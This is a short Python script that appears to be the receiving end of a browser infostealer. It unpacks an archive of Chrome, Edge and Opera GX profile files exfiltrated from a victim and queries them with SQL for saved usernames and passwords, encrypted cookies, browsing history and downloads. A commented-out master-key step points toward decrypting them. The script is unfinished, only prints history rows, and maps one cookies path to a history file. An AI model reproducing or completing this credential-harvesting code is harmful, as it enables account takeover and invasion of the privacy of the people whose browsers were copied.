import sqlite3
import os
import shutil


# Enviar de client a server , haciendo que en el serve se guarden en x sitio.

BasePath = "Data/"

COPY_PATH = {
    "CHROME_LOCAL_STATE_FILE_PATH": BasePath + "Chrome_Local_State",
    "CHROME_PASSWORDS_DB_PATH": BasePath + "Chrome_Login_Data",
    "CHROME_COOKIES_DB_PATH": BasePath + "Chrome_Cookies",
    "CHROME_HISTORY_DB_PATH": BasePath + "Chrome_History",
    "CHROME_BOOKMARKS_FILE_PATH": BasePath + "Chrome_Bookmarks",
    "EDGE_LOCAL_STATE_FILE_PATH": BasePath + "Edge_Local_State",
    "EDGE_PASSWORDS_DB_PATH": BasePath + "Edge_Login_Data",
    "EDGE_COOKIES_DB_PATH": BasePath + "Edge_History",
    "EDGE_BOOKMARKS_FILE_PATH": BasePath + "Edge_Bookmarks",
    "OPERAGX_LOCAL_STATE_FILE_PATH": BasePath + "OPERAGX_Local_State",
    "OPERAGX_PASSWORDS_DB_PATH": BasePath + "OPERAGX_Login_Data",
    "OPERAGX_COOKIES_DB_PATH": BasePath + "OPERAGX_Cookies",
    "OPERAGX_HISTORY_DB_PATH": BasePath + "OPERAGX_History",
    "OPERAGX_BOOKMARKS_FILE_PATH": BasePath + "OPERAGX_Bookmarks",
}

SQL = {
    "LOGIN_DATA_SQL": "SELECT origin_url, username_value, password_value, date_created, date_last_used FROM logins;",
    "COOKIES_SQL": "SELECT host_key, name, encrypted_value, path, is_secure, is_httponly, creation_utc, expires_utc, last_access_utc FROM cookies;",
    "HISTORY_SQL": "SELECT url, title, visit_count, last_visit_time FROM urls;",
    "DOWNLOADS_SQL": "SELECT target_path, tab_url, total_bytes, start_time, end_time FROM downloads;"
}

def get_db_data(file,command,master_key=None):
    con = sqlite3.connect(COPY_PATH[file])
    cursor = con.cursor()
    cursor.execute(SQL[command])
    data = cursor.fetchall()

    return data

def main():

    shutil.unpack_archive("Data123963.zip", "Data/")



    """
    get_master_key(TARGET_FILE_PATH["CHROME_LOCAL_STATE_FILE_PATH"], master_key_path)
     for file_path in TARGET_FILE_PATH:
    """


    x = get_db_data("CHROME_HISTORY_DB_PATH","HISTORY_SQL")
    for i in x:
        print(i)



if __name__ == "__main__":
    main()
